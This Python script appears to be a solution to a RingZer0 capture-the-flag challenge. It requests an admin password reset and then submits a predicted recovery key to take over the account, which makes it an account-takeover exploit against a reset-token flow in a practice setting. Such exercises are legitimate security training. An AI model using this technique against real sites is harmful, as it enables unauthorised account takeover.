from requests import get, post
import re
import time

def main():
    cookies = dict(PHPSESSID = "xxxxxxxxxxxxxxxxxxxxxxxx")
    url = "https://ringzer0team.com/challenges/120"

    # Ask for a password reset
    payload = {"reset_username": "admin"}
    html = post("%s" % (url), cookies=cookies, data=payload).content
    print("Asked for recovery key")
    time.sleep(0.1)

    # Submit the answer
    answer = "3675356291270936"
    html = get("%s/?k=%s" % (url, answer), cookies=cookies).content
    print("Sent: %s/?k=%s" % (url, answer))
    m1 = re.search(r"your new password", html)
    m2 = re.search(r"Invalid recovery key", html)
    if m1:
        print ("Password reset!")
    if m2:
        print ("Invalid recovery key")

if __name__ == "__main__":
    main()